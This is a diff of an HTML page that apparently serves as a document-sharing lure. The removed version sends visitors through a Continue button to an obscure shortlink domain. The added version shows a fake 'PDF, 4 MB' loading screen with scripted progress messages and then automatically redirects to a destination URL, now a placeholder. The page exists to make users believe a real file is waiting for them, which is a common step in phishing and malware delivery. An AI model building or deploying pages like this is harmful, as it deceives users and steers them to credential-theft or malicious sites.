@@ -3,99 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document | Continue</title>
+    <title>Your File</title>
 
     <style>
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
 
         body {
-            background-color: #f9f9f9;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f5f7fa;
+            color: #202124;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         .container {
+            width: 90%;
+            max-width: 520px;
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 45px 35px;
             text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        .icon {
+            width: 70px;
+            height: 85px;
+            margin: 0 auto 25px;
+            border: 2px solid #d9dde3;
+            border-radius: 7px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 25px;
+            font-weight: bold;
+            color: #d93025;
             background: #fff;
-            padding: 50px;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
-            width: 400px;
-            max-width: 90%;
-        }
-
-        .logo-box {
-            margin-bottom: 25px;
-        }
-
-        .logo-box img {
-            width: 180px;
-            height: auto;
         }
 
         h1 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 10px;
+            font-size: 25px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            color: #6b7280;
+            font-size: 15px;
+            margin-bottom: 32px;
+        }
+
+        .details {
+            text-align: left;
+            border-top: 1px solid #e5e7eb;
+            border-bottom: 1px solid #e5e7eb;
+            padding: 18px 0;
+            margin-bottom: 30px;
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 9px 0;
+            font-size: 15px;
+        }
+
+        .label {
+            color: #6b7280;
+        }
+
+        .value {
+            font-weight: 600;
+        }
+
+        .status {
+            font-size: 16px;
             font-weight: 500;
+            margin-bottom: 20px;
         }
 
-        p {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 25px;
+        .loader {
+            width: 38px;
+            height: 38px;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #333;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 18px;
         }
 
-        .continue-btn {
-            display: inline-block;
+        .progress {
             width: 100%;
-            padding: 13px 20px;
-            background: #005cb9;
-            color: #fff;
-            text-decoration: none;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
+            height: 5px;
+            background: #e5e7eb;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 20px;
         }
 
-        .continue-btn:hover {
-            opacity: 0.9;
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #333;
+            transition: width 0.5s ease;
+        }
+
+        .small {
+            color: #8a8f98;
+            font-size: 12px;
+            margin-top: 18px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
     </style>
 </head>
 
 <body>
 
-    <div class="container">
+<div class="container">
 
-        <div class="logo-box">
-            <img src="logo.png" alt="Document">
+    <div class="icon">PDF</div>
+
+    <h1 id="title">Welcome to your file</h1>
+
+    <p class="subtitle" id="message">
+        Preparing your document...
+    </p>
+
+    <div class="details">
+        <div class="row">
+            <span class="label">File type</span>
+            <span class="value">PDF</span>
         </div>
 
-        <h1>Document Ready</h1>
-
-        <p>Please click Continue to proceed.</p>
-
-        <button class="continue-btn" onclick="openDocument()">
-            Continue
-        </button>
-
+        <div class="row">
+            <span class="label">File size</span>
+            <span class="value">4 MB</span>
+        </div>
     </div>
 
-    <script>
-        function openDocument() {
-            const destination = "https://2vxsuamei2.onlinebrandedge.de/l/QN5zebHT_d8";
-            window.open(destination, "_blank", "noopener,noreferrer");
-        }
-    </script>
+    <div class="loader"></div>
+
+    <div class="status" id="status">
+        Loading your document...
+    </div>
+
+    <div class="progress">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <p class="small">
+        Please wait while your document is being prepared.
+    </p>
+
+</div>
+
+<script>
+
+    const destination = "https://example.com";
+
+    const title = document.getElementById("title");
+    const message = document.getElementById("message");
+    const status = document.getElementById("status");
+    const progressBar = document.getElementById("progressBar");
+
+    setTimeout(() => {
+        title.textContent = "File type: PDF";
+        message.textContent = "Checking your document...";
+        progressBar.style.width = "30%";
+    }, 1800);
+
+    setTimeout(() => {
+        title.textContent = "File size: 4 MB";
+        message.textContent = "Document information confirmed.";
+        progressBar.style.width = "60%";
+    }, 3600);
+
+    setTimeout(() => {
+        title.textContent = "Hold on";
+        message.textContent = "Your document is almost ready.";
+        status.textContent = "Loading your document...";
+        progressBar.style.width = "85%";
+    }, 5400);
+
+    setTimeout(() => {
+        progressBar.style.width = "100%";
+        status.textContent = "Opening your document...";
+    }, 6500);
+
+    setTimeout(() => {
+        window.location.href = destination;
+    }, 7200);
+
+</script>
 
 </body>
 </html>
